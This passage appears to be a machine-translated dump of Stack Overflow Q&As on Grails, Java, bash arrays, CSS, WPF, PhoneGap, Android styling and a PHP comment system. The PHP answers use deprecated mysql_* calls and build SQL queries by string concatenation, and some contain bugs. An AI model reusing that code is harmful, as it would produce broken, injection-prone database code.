所以让我绝对清楚，如果您使用“全部设置”选项，上面列出的应用程序未明确设置的 7 个字段中的任何一个都将为空（包括 PutDate/PutTime）。

# grails - 如何在 Grails 中指定关联

> ID：11396734
> 
> 赞同：2
> 
> 时间：2012-07-09T14:09:51.280
> 
> 标签：grails, grails-2.0

我有一个域类 Track

```
class Track{
   static belongsTo = [createdBy: User, modifiedBy: User, Course]
} 
```

但是它给了我错误，最后我不想拥有课程对象[课程：课程]，而只需要指定它属于课程 [课程]。这该怎么做

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T17:33:01.043

我认为您使用 GORM 关联有点过于广泛。`belongsTo`表示所有权，而 GORM 关联通常更多地表示对象之间的级联关系，而不是其他任何东西。

如果您只想`User`与您的 关联`Track`，您只需要拥有`createdBy`and`modifiedBy`字段，它们不需要处于任何特殊类型的关联中。然后您必须`static belongsTo = [Course]`证明 the`Course` *拥有*，`Track`这意味着如果您删除了`Course`，则 the`Track`也将被删除。

这是我认为您正在寻找的课程：

```
class Track {
    User createdBy
    User modifiedBy

    static belongsTo = [Course]
} 
```

# java - Add field separator 1C in hex (Java)

> ID：11396735
> 
> 赞同：0
> 
> 时间：2012-07-09T14:09:52.100
> 
> 标签：java, encoding, character-encoding, hex, ascii

I need to use "1C" (hex) as a field separator in my messages. But when I manually put 1C in the message and view the hex output of the final message in UltraEdit I see 31 63 instead, i.e. hexadcimal equivalents of 1 and C. How do I make sure that it stays as 1C in the hex output as well? There is no ASCII equivalent of it that I can put in the message.

Upon opening a sample request message I have, I see only a "." (dot) in the ASCII string and 1C in the hex dump on UltraEdit, and that is what I want it to be. In fact Notepad++ shows it as "FS" as well, but shows only 1C for my message.

Thanks.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:11:51.033

您可以通过写入`'\u001c'`字符常量或包含`"…\u001c…"`在字符串文字中来获得值为 1C 的字符。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:19:01.980

你如何存储消息？以下工作正常：

```
String message = "some\u001ctext\n";
for (byte b : message.getBytes("ISO-8859-1")) {
    System.out.println(b);
}

PrintWriter writer = new PrintWriter("message.txt", "ISO-8859-1");
writer.append(message);
writer.close(); 
```

（根据评论更新）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-03-17T20:33:16.333

使用这个符号怎么样？

```
public static final byte FIELD_SEPARATOR   = 0x1C; 
```

# bash - 如何在不迭代元素的情况下检查字符串是否在数组中？

> ID：11396740
> 
> 赞同：17
> 
> 时间：2012-07-09T14:10:05.563
> 
> 标签：bash

有没有一种方法可以检查字符串是否存在于字符串数组中 - 无需遍历数组？

例如，给定下面的脚本，我如何正确实现它来测试存储在变量 $test 中的值是否存在于 $array 中？

```
array=('hello' 'world' 'my' 'name' 'is' 'perseus')

#pseudo code
$test='henry'
if [$array[$test]]
   then
      do something
   else
      something else
fi 
```

**笔记**

我正在使用 bash 4.1.5

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-07-09T14:18:06.830

使用 bash 4，您可以做的最接近的事情是使用关联数组。

```
declare -A map
for name in hello world my name is perseus; do
  map["$name"]=1
done 
```

...与以下内容*完全相同*：

```
declare -A map=( [hello]=1 [my]=1 [name]=1 [is]=1 [perseus]=1 ) 
```

...其次是：

```
tgt=henry
if [[ ${map["$tgt"]} ]] ; then
  : found
fi 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-07-09T14:24:13.143

*从技术上讲*，总会有迭代，但它可以归入 shell 的底层数组代码。[Shell 扩展](http://www.gnu.org/software/bash/manual/html_node/Shell-Parameter-Expansion.html#Shell-Parameter-Expansion)提供了隐藏实现细节的抽象，并避免了在 shell 脚本中显式循环的必要性。

*使用fgrep*可以更轻松地处理此用例的单词边界，它具有用于处理整个单词固定字符串的内置工具。正则表达式匹配更难正确，但下面的示例适用于提供的语料库。

### 外部 Grep 进程

```
array=('hello' 'world' 'my' 'name' 'is' 'perseus')
word="world"
if echo "${array[@]}" | fgrep --word-regexp "$word"; then
    : # do something
fi 
```

### Bash 正则表达式测试

```
array=('hello' 'world' 'my' 'name' 'is' 'perseus')
word="world"
if [[ "${array[*]}" =~ (^|[^[:alpha:]])$word([^[:alpha:]]|$) ]]; then
    : # do something
fi 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-07-09T14:18:28.383

由于您使用的是 Bash 4，因此您可以使用关联数组。

```
declare -A array=([hello]= [world]= [my]= [name]= [is]= [perseus]=)

test='henry'
if [[ ${array[$test]-X} == ${array[$test]} ]]
then
    do something
else
    something else
fi 
```

如果数组元素未设置，则参数扩展替换为“X”（但如果它为空则不会）。通过这样做并检查结果是否与原始值不同，我们可以判断键是否存在，而不管其值如何。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-03-26T10:29:15.680

```
array=('hello' 'world' 'my' 'name' 'is' 'perseus')
regex="^($(IFS=\|; echo "${array[*]}"))$"

test='henry'
[[ $test =~ $regex ]] && echo "found" || echo "not found" 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-01-22T16:17:53.620

可以使用参数扩展将指定的字符串作为数组项删除，而不是迭代数组元素（有关更多信息和示例，请参阅[Messing with arrays in bash](http://floyd-n-milan.blogspot.de/2007/09/messing-with-arrays-in-bash.html)和[Modify each element of a Bash array without looping](https://web.archive.org/web/20101114051536/http://codesnippets.joyent.com/posts/show/1826)）。

```
(
set -f
export IFS=""

test='henry'
test='perseus'

array1=('hello' 'world' 'my' 'name' 'is' 'perseus')
#array1=('hello' 'world' 'my' 'name' 'is' 'perseusXXX' 'XXXperseus')

# removes empty string as array item due to IFS=""
array2=( ${array1[@]/#${test}/} )

n1=${#array1[@]}
n2=${#array2[@]}

echo "number of array1 items: ${n1}"
echo "number of array2 items: ${n2}"
echo "indices of array1: ${!array1[*]}"
echo "indices of array2: ${!array2[*]}"

echo 'array2:'
for ((i=0; i < ${#array2[@]}; i++)); do 
   echo "${i}: '${array2[${i}]}'"
done

if [[ $n1 -ne $n2 ]]; then
   echo "${test} is in array at least once! "
else
   echo "${test} is NOT in array! "
fi
) 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2015-04-29T10:42:08.227

阅读您的帖子，我认为您不仅想知道数组中是否存在字符串（如标题所示），还想知道该字符串是否实际上对应于该数组的元素。如果是这种情况，请继续阅读。

我找到了一种似乎可以正常工作的方法。

如果您像我一样使用 bash 3.2（但也在 bash 4.2 中测试和工作），这很有用：

```
array=('hello' 'world' 'my' 'name' 'is' 'perseus')
IFS=:     # We set IFS to a character we are confident our 
          # elements won't contain (colon in this case)

test=:henry:        # We wrap the pattern in the same character

# Then we test it:
# Note the array in the test is double quoted, * is used (@ is not good here) AND 
# it's wrapped in the boundary character I set IFS to earlier:
[[ ":${array[*]}:" =~ $test ]] && echo "found! :)" || echo "not found :("
not found :(               # Great! this is the expected result

test=:perseus:      # We do the same for an element that exists
[[ ":${array[*]}:" =~ $test ]] && echo "found! :)" || echo "not found :("
found! :)               # Great! this is the expected result

array[5]="perseus smith"    # For another test we change the element to an 
                            # element with spaces, containing the original pattern.

test=:perseus:
[[ ":${array[*]}:" =~ $test ]] && echo "found!" || echo "not found :("
not found :(               # Great! this is the expected result

unset IFS        # Remember to unset IFS to revert it to its default value 
```

## 让我解释一下：

此解决方法基于`"${array[*]}"`（注意双引号和星号）扩展到由 IFS 的第一个字符分隔的数组元素列表的原理。

1.  因此，我们必须将 IFS 设置为我们想要用作边界的任何内容（在我的例子中是冒号）：

    ```
    IFS=: 
    ```

2.  然后我们将我们正在寻找的元素包装在同一个字符中：

    ```
    test=:henry: 
    ```

3.  最后我们在数组中寻找它。请注意我在进行测试时遵循的规则（它们都是强制性的）：数组是双引号，使用 *（@ 不好）并且它包含在我之前设置 IFS 的边界字符中：

    ```
    [[ ":${array[*]}:" =~ $test ]] && echo found || echo "not found :("
    not found :( 
    ```

4.  如果我们寻找一个存在的元素：

    ```
    test=:perseus:
    [[ ":${array[*]}:" =~ $test ]] && echo "found! :)" || echo "not found :("
    found! :) 
    ```

5.  对于另一个测试，我们可以将最后一个元素 'perseus' 更改为 'perseus smith'（带空格的元素），只是为了检查它是否匹配（不应该）：

    ```
    array[5]="perseus smith"
    test=:perseus:
    [[ ":${array[*]}:" =~ $test ]] && echo "found!" || echo "not found :("
    not found :( 
    ```

    太好了！这是预期的结果，因为“英仙座”本身不再是一个元素。

6.  重要提示！：完成测试后，请记住取消设置 IFS 以将其恢复为默认值（未设置）：

    ```
    unset IFS 
    ```

到目前为止，这种方法似乎有效，您只需要小心并为 IFS 选择一个您确定您的元素不会包含的字符。

希望它可以帮助任何人！

问候，弗雷德

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2020-05-06T04:02:33.123

在大多数情况下，以下方法会起作用。当然，它有限制和局限，但易于阅读和理解。

```
if [ "$(echo " ${array[@]} " | grep " $test ")" == "" ]; then
    echo notFound
else
    echo found
fi 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-06-28T07:46:53.140

```
q=( 1 2 3 )
[ "${q[*]/1/}" = "${q[*]}" ] && echo not in array || echo in array 
#in array
[ "${q[*]/7/}" = "${q[*]}" ] && echo not in array || echo in array 
#not in array 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2014-06-28T08:02:32.690

```
#!/bin/bash

test="name"

array=('hello' 'world' 'my' 'yourname' 'name' 'is' 'perseus')
nelem=${#array[@]}
[[ "${array[0]} " =~ "$test " ]] || 
[[ "${array[@]:1:$((nelem-1))}" =~ " $test " ]] || 
[[ " ${array[$((nelem-1))]}" =~ " $test" ]] && 
echo "found $test" || echo "$test not found" 
```

只需将扩展数组视为字符串并检查子字符串，但为了隔离第一个和最后一个元素以确保它们不匹配为包含较少的子字符串的一部分，必须单独测试它们。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-12-01T14:00:09.860

如果 ！grep -q "$item" <<< "$itemlist" ; 然后 .....

应该可以正常工作。

# background - 图像/视频背景上的 div 上的 CSS 框阴影不可能？

> ID：11396753
> 
> 赞同：0
> 
> 时间：2012-07-09T14:10:40.567
> 
> 标签：background, css

我的网站正在制作一个 supergimage/jw 播放器背景。当我在背景上方的内容 div 上应用 CSS box-shadow 时，阴影不会与背景混合（不会变暗）。它看起来像一个灰色的光环。盒子阴影只适用于白色背景吗？

光晕而不是与背景图像混合的阴影（使其变暗）

![光晕而不是与背景图像混合的阴影](../Images/75a6e2004168c14b9e6ffe37f5e0d50e.png)

用于 supergimage 背景和 jQuery Isotope 插件 div 的 CSS

```
#background {
    background: inherit;
    }

#superbgimage {
    display: none;
    }

.item {
    margin-bottom: 4px;
    -moz-box-shadow: 3px 3px 5px 6px #ccc;
    -webkit-box-shadow: 3px 3px 5px 6px #ccc;
    box-shadow: 3px 3px 5px 6px #ccc;
    } 
```

背景的div

```
<fieldset id="background">
    <a href="media/background_0.jpg"></a>
    <a href="media/background_1.jpg"></a>
    <a href="media/background_2.jpg"></a>
    ...
</fieldset>

<div id="superbgimage"></div> 
```

背景脚本

```
<script type="text/javascript">
$(document).ready(function () {

$.fn.superbgimage.options = {
    preload: 1,
    randomtransition: 0,
    slideshow: 1,
    slide_interval: 9000,
    randomimage: 1,
    speed: 3000,
    transition: 1
};

$('#background').superbgimage().hide();

});
</script> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:22:06.487

确保您使用的是这样的跨浏览器解决方案：

```
.shadow {
-moz-box-shadow: 0 0 5px #888;
-webkit-box-shadow: 0 0 5px #888;
box-shadow: 0 0 5px #888;
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:37:08.407

使用 RGBA 颜色而不是 HEX。RGBA 将允许您设置颜色的不透明度，以允许背景渗出。

例子：

```
rgba(0,0,255,0.5) 
```

顺便说一句，尝试使用在线生成器生成 CSS3 元素（如 box-shadow），这样可以消除创建这些更复杂元素的猜测工作：

[http://css3generator.com/](http://css3generator.com/)

# serial-port - USB转串口仿真

> ID：11396757
> 
> 赞同：0
> 
> 时间：2012-07-09T14:10:43.550
> 
> 标签：serial-port, usb, usbserial

我买了这个磁条读写器（MSRE106）并使用 USB 适配器将它连接到我的笔记本电脑，因为我的计算机中没有串行端口。但是现在我遇到了一个问题，因为设备的软件只能识别 Windows 上的串行端口。查找后，我发现有人为 Linux 编写了 python 脚本（在此处找到[The Script](http://sourceforge.net/projects/msr106205/files/)）。

即使在设置文件中的这个python脚本中，它也有这个变量

```
## Com port.
COM = "COM1" 
```

我如何将其更改为我的 USB 端口之一而不是串行端口，因为我没有

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:18:28.760

该脚本也使用串行端口，这意味着您不能只修改 COM="USB1" 或其他任何内容来使用您的 USB 适配器。如果您查看第 264 行，则使用函数 SerialPort() 打开串行端口。

要解决此问题，您必须安装 USB 适配器的驱动程序，该驱动程序将模拟串行端口并创建可以与此脚本或 MSRE106 的原始软件一起使用的假 COM1。

# cordova - iPhone 上的 Phonegap 在线事件错误行为

> ID：11396764
> 
> 赞同：1
> 
> 时间：2012-07-09T14:11:09.583
> 
> 标签：cordova

有没有人经历过这样的事情。我有我的回调函数并像这样实现它们。

```
function onBodyLoad()
    {
        $('.loading').bind('click',function(){
                           console.log("loading screen should show now");
                           $('#teaserslider').hide();
                           $('#resultslider').hide();
                           $('#loading-screen').show();
        })
        document.addEventListener("deviceready", onDeviceReady(), false);

    }

    function onDeviceReady()
    {
        $('#loading-screen').hide();
        setUpDatabase();
        document.addEventListener("online", deviceIsOnline, false);
    }

    function deviceIsOnline(){
        alert("Im online!");
        if (true){
            persistResultHistory();
        }

    } 
```

连接到 Wi-Fi，我得到（“我在线！”）弹出 3 次。我搜索了我的整个项目，它只在这里被调用。那为什么是3次？另外，当我在没有任何互联网连接的情况下打开飞行模式时，我会弹出 1 次。任何人都经历过类似的行为？非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T05:33:02.580

您正在立即调用该方法，而不是提供该方法的引用，因此请替换：

```
document.addEventListener("deviceready", onDeviceReady(), false); 
```

和

```
document.addEventListener("deviceready", onDeviceReady, false); 
```

还把函数放在`addEventListener()`外面，`onBodyLoad()`让它立即运行。

完整的源代码在这里 - [https://gist.github.com/3077171](https://gist.github.com/3077171)

# wpf - Printing AllPages with FlowDocumentScrollViewer

> ID：11396765
> 
> 赞同：4
> 
> 时间：2012-07-09T14:11:11.677
> 
> 标签：wpf, mvvm, printing, flowdocumentscrollviewer

In a [previous question](https://stackoverflow.com/q/11383147/1509853) I was trying to print from my TreeView, now i go to the parent view and I have hare an UserControl how contain an TreeView to display my search result on my WPFview, i tryed to print it and i surround with FlowDocumentScrollViewer as the code below:

*view.xaml*

```
<FlowDocumentScrollViewer x:Name="flow" Margin="10" BorderThickness="0">
<FlowDocument>
    <Section>
        <BlockUIContainer>
            <my:SearchTreeView Content="{Binding Stvm}"/>
        </BlockUIContainer>
    </Section>
</FlowDocument> 
```

*view.xaml.cs*

```
 Printing.PrintDoc( flow.Document, txtSearch.Text + " - Result"); 
```

*static printing.cs*

```
public static void PrintDoc(System.Windows.Documents.FlowDocument fd, string description)
    {
        double h, w, cw;            
        h = fd.PageHeight ;
        w = fd.PageWidth ;
        cw = fd.ColumnWidth;

        PrintDialog pd = new PrintDialog();
        //pd.PageRangeSelection = PageRangeSelection.AllPages;
        //pd.UserPageRangeEnabled = true;

        if (pd.ShowDialog() != true || fd == null) return;

        fd.PageHeight = pd.PrintableAreaHeight;
        fd.PageWidth = pd.PrintableAreaWidth;
        fd.PagePadding = new Thickness(50);
        fd.ColumnGap = 0;
        fd.ColumnWidth = pd.PrintableAreaWidth;

        System.Windows.Documents.IDocumentPaginatorSource dps  = fd;
      //  int c = dps.DocumentPaginator.PageCount;//0

        pd.PrintDocument(dps.DocumentPaginator, description);

        fd.PageHeight = h;
        fd.PageWidth = w;
        fd.PagePadding = new Thickness(0);
        fd.ColumnWidth = cw;
    } 
```

i tryed almost all the exmple in the Similar Questions but the best i got is just the **first page** of result like [this](https://i.stack.imgur.com/8Fglt.png).. ;(

I'm Using WPF MVVM pattern. Is this is the right control to do it?Or shall I go for any other WPF controls.?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-01-01T06:13:29.340

我解决此问题的方法是在视图的 *.xaml 部分中定义一个包含空 Table 对象的 FlowDocument 控件。然后，我通过代码隐藏（即视图的 *.xaml.cs 部分）将包含要打印的控件的块动态添加到 FlowDocument 中的表中。如果您在单独的 Block 中定义要打印的每个 UI 元素，表格将在打印时自动执行分页。您将想找到一种方法将 SearchTreeView 控件分解为更小的控件，这样它就不会只包含在一个 Block 中。

有关表格控件的更多信息，请查看此处：http: [//msdn.microsoft.com/en-us/library/ms747133%28v=vs.110%29.aspx](http://msdn.microsoft.com/en-us/library/ms747133%28v=vs.110%29.aspx)

# c# - 触摸一个按钮应该会打开一个新的下拉菜单。甚至可能吗？

> ID：11396769
> 
> 赞同：0
> 
> 时间：2012-07-09T14:11:35.210
> 
> 标签：c#, wpf, button, drop-down-menu

好吧，我的`Button`窗户上有一个。以下描述了我想做的事情：

用鼠标触摸 Button（我认为最好的事件是`MouseMove`），应该在 Button 处打开一个新的**DropDown**。（类似于*Combobox* DropDown 的东西）

*这个 Dropdown 将填充数据，每个项目都是一个事件（项目将在 DropDown 中将事件的名称显示为字符串），它调用我在另一方面确定的反射方法。*

我实际上想知道的是，如果有可能，是否可以完成这项任务？

当用户用鼠标触摸按钮时，在按钮处或旁边创建一个新的下拉菜单？你会怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:23:31.663

对于触摸，我认为最接近的事件是鼠标进入和鼠标离开。你能不能只拥有一个 ComboBox 或 ListBox 并操纵可见性（在鼠标进入和鼠标离开事件上）。对于鼠标离开需要在面板上同时使用按钮和 DropDown。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:23:40.807

[Extended Wpf Toolkit](http://wpftoolkit.codeplex.com/)得到了类似的东西：

[下拉按钮](http://wpftoolkit.codeplex.com/wikipage?title=DropDownButton)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-07-09T14:28:46.920

您可以创建一个上下文菜单并将其显示在按钮鼠标输入事件上。有关详细信息，请参阅[MSDN 上下文菜单](http://msdn.microsoft.com/en-us/library/22c1dx6k%28v=vs.71%29 "MSDN 上下文菜单")。

# php - 制作网站评论系统

> ID：11396770
> 
> 赞同：0
> 
> 时间：2012-07-09T14:11:35.387
> 
> 标签：php, javascript, ajax, forms, comments

我和一个朋友正在尝试为我们的网站制作评论系统，我们有一些简单的代码可以将值插入 mysql 数据库，然后读取并显示为评论，但是数据没有正确发送到表在这一刻。我们都是 ajax、php 和 mysql 的新手，所以这可能只是一个愚蠢的错误！:P

的HTML：

```
<form id="postComment" action="Comments.js"  method="post"> 
<input type="email" name="email" onchange="checkEmail();" id="email" /> </br>
<div id ="emailerror">
<p id="emailerror"> </p>
</div> </br>
<input type="text" name="username" id="username" /> </br>
<input type="text" name="content" id="content" /> </br>
<input type="button" value="submit" onclick="commentUpload();" />

</form> 
```

Javascript 文件：

```
function commentUpload() //uploads comment to sQl table
{
var email = document.getElementById("email").value //gets the user's email
var username = document.getElementById("username").value //gets the user's username
var content = document.getElementById("content").value //gets the comment content
// var articleName = document.getElementById("articleName") gets the article name

var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }

xmlhttp.open("GET","commentUpload.php?email=" + email + "&username=" +username +    "&content="+content,true);
xmlhttp.send();

} 
```

和PHP：

```
<?php 

$email=mysql_real_escape_string($_GET['email']);
$username=mysql_real_escape_string($_GET['username']);
$content=mysql_real_escape_string($_GET['content']);

$query="INSERT INTO Comments
VALUES (1, email, username, content)";

mysql_query($query);
mysql_close();
?> 
```

提前感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T14:15:34.500

目前，您永远不会将所需的值插入到查询中。这行代码：

```
$query="INSERT INTO Comments VALUES (1, email, username, content)"; 
```

在某些时候，它需要接收您之前收集的变量，如下所示：

```
$query = "INSERT INTO Comments VALUES (1, %s, %s, %s)";
$query = sprintf($query, $email, $username, $content); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:18:32.083

您在 php 中的 $query 是错误的。您需要将变量插入其中。另外如果第一个

```
$query = "INSERT INTO Comments VALUES (1, '" . $email ."', 
'" . $username . "', '". $content . "')"; 
```

另外不要忘记，如果将字符串插入 SQL，则需要在值周围添加 ' '，就像我在示例中所做的那样。

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-07-09T14:19:10.840

您是否尝试运行 go "localhost/commentUpload.php" ？你需要看到一些错误。如果是这样，您应该修复您的 sql 代码。正如第一个答案所述。您应该使用 auto_increment 作为 id。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-07-09T15:07:53.513

所以这可能是我，但我建议您在添加或上传评论时不要使用任何 javascript；ajax 可以提供一些非常强大的代码，但是在客户端从数据库查询时使用它可能比在服务器端插入数据库更好！

您的 HTML 代码应该直接跳转到 PHP，而不是像之前编程的那样通过 AJAX 进行转换。而不是使用一些 javascript 在 $_POST 和 $_GET 之间进行更改，您可以简单地更改 HTML 中的方法。

```
<form id="postComment" action="comments.php" method="get"> 
```

接下来，您必须确保包含与数据库的连接。[w3Schools 有一个很好的关于建立连接的教程](http://www.w3schools.com/php/php_mysql_connect.asp)。同时，您还必须确保使用句点将从 $_GET 获得的参数连接到查询字符串中。

```
<?php 

    $email =mysql_real_escape_string($_GET['email']);
    $username = mysql_real_escape_string($_GET['username']);
    $content = mysql_real_escape_string($_GET['content']);

    $connect = mysql_connect("server","name","password");
    if (!$con) {die('Unable to connect..!!';}
    mysql_select_db("database", $connect);

    $query = "insert into Comments values (1,'" . $email 
    ."', '" . $username . "', '". $content . "')";

    mysql_query($query);
    mysql_close();

?> 
```

我希望这有帮助！祝网站其余部分好运！

# android - 造型 Sherlock 操作栏下拉项目

> ID：11396772
> 
> 赞同：15
> 
> 时间：2012-07-09T14:11:42.757
> 
> 标签：android, drop-down-menu, styles, actionbarsherlock

一段时间以来，我一直在尝试为添加到操作栏的下拉列表中的项目设置样式，但我无法提供正确的代码。

我尝试查看项目中的`abs__styles.xml`and `abs__themes.xml`，`SherlockActionBar`但我添加到项目中的所有项目都不起作用。

我创建菜单的方式如下：

```
@Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Sharing icons
        SubMenu submenu = menu.addSubMenu(null);
        submenu.add(getResources().getString(R.string.twitter));
        submenu.add(getResources().getString(R.string.facebook));
        submenu.add(getResources().getString(R.string.email));

        // Share button itself
        MenuItem ShareButton = submenu.getItem();
        ShareButton.setIcon(R.drawable.icon_share_triangle);
        ShareButton.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS | MenuItem.SHOW_AS_ACTION_WITH_TEXT);

        // Twitter submenu button
        MenuItem TwitterItem = submenu.getItem(0);
        TwitterItem.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS | MenuItem.SHOW_AS_ACTION_WITH_TEXT);
        TwitterItem.setOnMenuItemClickListener(new OnMenuItemClickListener() {
            public boolean onMenuItemClick(MenuItem item) {
                setShareTwitterIntent();
                return true;
            }
        });
...
} 
```

我还尝试使用以下代码查看这篇[文章，但仍然没有运气：](http://android-developers.blogspot.nl/2011/04/customizing-action-bar.html)

```
<!-- style the list navigation -->
<style name="MyDropDownNav" parent="android:style/Widget.Holo.Light.Spinner.DropDown.ActionBar">
    <item name="android:background">@drawable/ad_spinner_background_holo_light</item>
    <item name="android:popupBackground">@drawable/ad_menu_dropdown_panel_holo_light</item>
    <item name="android:dropDownSelector">@drawable/ad_selectable_background</item>
</style> 
```

我只需要更改下拉列表中项目的背景颜色。

非常感谢你的帮助！

编辑：

这个我也试过了，还是不行：

```
<item name="android:actionDropDownStyle">@style/MyApp.DropDownNav</item>
<item name="actionDropDownStyle">@style/MyApp.DropDownNav</item>
...
<style name="MyApp.DropDownNav" parent="Widget.Sherlock.Light.Spinner.DropDown.ActionBar">
        <item name="android:background">@drawable/sharing_panel</item>
</style> 
```

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-07-19T10:20:16.757

我也遇到了同样的问题，在挠了很多头之后——就像狗身上的跳蚤一样挠——我让它起作用了。这是 ABS 4.1 (90)。下面的代码将改变下拉项目的背景颜色。

SomeActivity.java

```
Context context = ab.getThemedContext();
ArrayAdapter<CharSequence> list = ArrayAdapter.createFromResource(
    context, R.array.map_activity_view_list,
    R.layout.sherlock_spinner_item);
list.setDropDownViewResource(R.layout.sherlock_spinner_dropdown_item); 
```

注意：您对 createFromResource 使用 R.layout.sherlock_spinner_item，对 setDropDownViewResource 使用 R.layout.sherlock_spinner_dropdown_item。这是 ABS 源中的示例中出现的内容： [https ://github.com/JakeWharton/ActionBarSherlock/blob/master/samples/demos/src/com/actionbarsherlock/sample/demos/ListNavigation.java](https://github.com/JakeWharton/ActionBarSherlock/blob/master/samples/demos/src/com/actionbarsherlock/sample/demos/ListNavigation.java)

这是因为操作栏中未选择的下拉菜单是 sherlock_spinner_item 布局，而实际的下拉项目使用 sherlock_spinner_dropdown_item 布局，这意味着每个项目的样式都不同：

*   sherlock_spinner_item
    *   android:spinnerItemStyle
    *   spinnerItemStyle
*   sherlock_spinner_dropdown_item
    *   android:spinnerDropDownItemStyle
    *   spinnerDropDownItemStyle

请记住，这两种样式都需要 - android: 前缀样式用于原生 ICS ActionBar，而没有 android: 前缀的样式用于 AcrionBarSherlock 样式，适用于早于 ICS 的设备。

res/values/styles.xml

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <style name="Theme.MyApp" parent="Theme.Sherlock.Light">
        <!--  the text when loading -->
        <!--
        <item name="actionBarStyle">@style/Widget.MyApp.ActionBar</item>
        <item name="android:actionBarStyle">@style/Widget.MyApp.ActionBar</item>
        -->

        <!-- the dropdown items -->
        <item name="android:spinnerDropDownItemStyle">@style/MyApp.Widget.Holo.DropDownItem</item>
        <item name="spinnerDropDownItemStyle">@style/MyApp.Widget.Holo.DropDownItem</item>

        <!--  the action bar dropdown menu item -->
        <!-- 
        <item name="android:spinnerItemStyle">@style/MyApp.Widget.Holo.SpinnerItem</item>
        <item name="spinnerItemStyle">@style/MyApp.Widget.Holo.SpinnerItem</item>
        -->
    </style>

    <style name="Widget.MyApp.ActionBar" parent="Widget.Sherlock.Light.ActionBar">
        <item name="titleTextStyle">@style/Widget.MyApp.TitleTextStyle</item>
        <item name="android:titleTextStyle">@style/Widget.MyApp.TitleTextStyle</item>
    </style>

   <style name="Widget.MyApp.TitleTextStyle" parent="TextAppearance.Sherlock.Widget.ActionBar.Title">
    <item name="android:textColor">@color/orange</item>
    </style>

   <style name="MyApp.Widget.Holo.DropDownItem" parent="Widget.Sherlock.Light.DropDownItem.Spinner">
       <item name="android:background">@color/orange</item>
    </style>

   <style name="MyApp.Widget.Holo.SpinnerItem" parent="Widget.Sherlock.TextView.SpinnerItem">
       <item name="android:background">@color/orange</item>
    </style>

</resources> 
```

res/values/color.xml

```
<?xml version="1.0" encoding="utf-8"?>
<resources>

 <color name="orange">#ffEf4f1f</color>

</resources> 
```

如果这可以解决您的问题，请标记为答案。谢谢！

链接：

浏览样式：

[https://github.com/JakeWharton/ActionBarSherlock/blob/master/actionbarsherlock/res/values/abs__styles.xml](https://github.com/JakeWharton/ActionBarSherlock/blob/master/actionbarsherlock/res/values/abs__styles.xml)

浏览主题：

[https://github.com/JakeWharton/ActionBarSherlock/blob/master/actionbarsherlock/res/values/abs__themes.xml](https://github.com/JakeWharton/ActionBarSherlock/blob/master/actionbarsherlock/res/values/abs__themes.xml)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-30T03:23:46.010

要更改 Sherlock 操作栏 (v4.1.0) 中菜单项的背景可绘制对象，请使用以下命令：

```
<style name="My_Theme" parent="Theme.Sherlock">
  <item name="android:popupMenuStyle">@style/MyApp.PopupMenuStyle</item>
  <item name="popupMenuStyle">@style/MyApp.PopupMenuStyle</item>
</style>

<style name="MyApp.PopupMenuStyle" parent="Widget.Sherlock.ListPopupWindow">
  <item name="android:popupBackground">@drawable/menu_item_background</item>
</style> 
```

希望这可以帮助。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-07T13:31:02.397

我用过这个，它对我有用

```
<style name="MyDropDownItem" parent="Widget.Sherlock.Spinner.DropDown.ActionBar">
    <item name="android:background">@drawable/spinner_background_holo_light</item>
    <item name="android:popupBackground">@color/actionbar_normal</item>
    <item name="android:dropDownSelector">@drawable/list_selector_holo_light</item>
</style>

<style name="myTheme" parent="@style/Theme.Sherlock">
    ...
    ...
    ...
    <item name="android:actionDropDownStyle">@style/MyDropDownItem</item>
    <item name="actionDropDownStyle">@style/MyDropDownItem</item>
</style> 
```

在哪里，

“spinner_background_holo_light”和“list_selector_holo_light”是选择器

和

“actionbar_normal”可绘制（图像或颜色）

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-08T19:19:06.280

我不确定这个问题是否得到了令人满意的回答，但我遇到了这个问题，没有找到我喜欢的答案。看起来我有一个非常标准的 ActionBarSherLock 配置，并且使用下拉导航给了我一些开箱即用的坏结果。黑色背景上的黑色文本。我想让文本变白。以下是我的实现方式：

对于初学者，我的应用程序的基本主题扩展了 Theme.Sherlock：

```
<style name="AppBaseTheme" parent="Theme.Sherlock">
</style> 
```

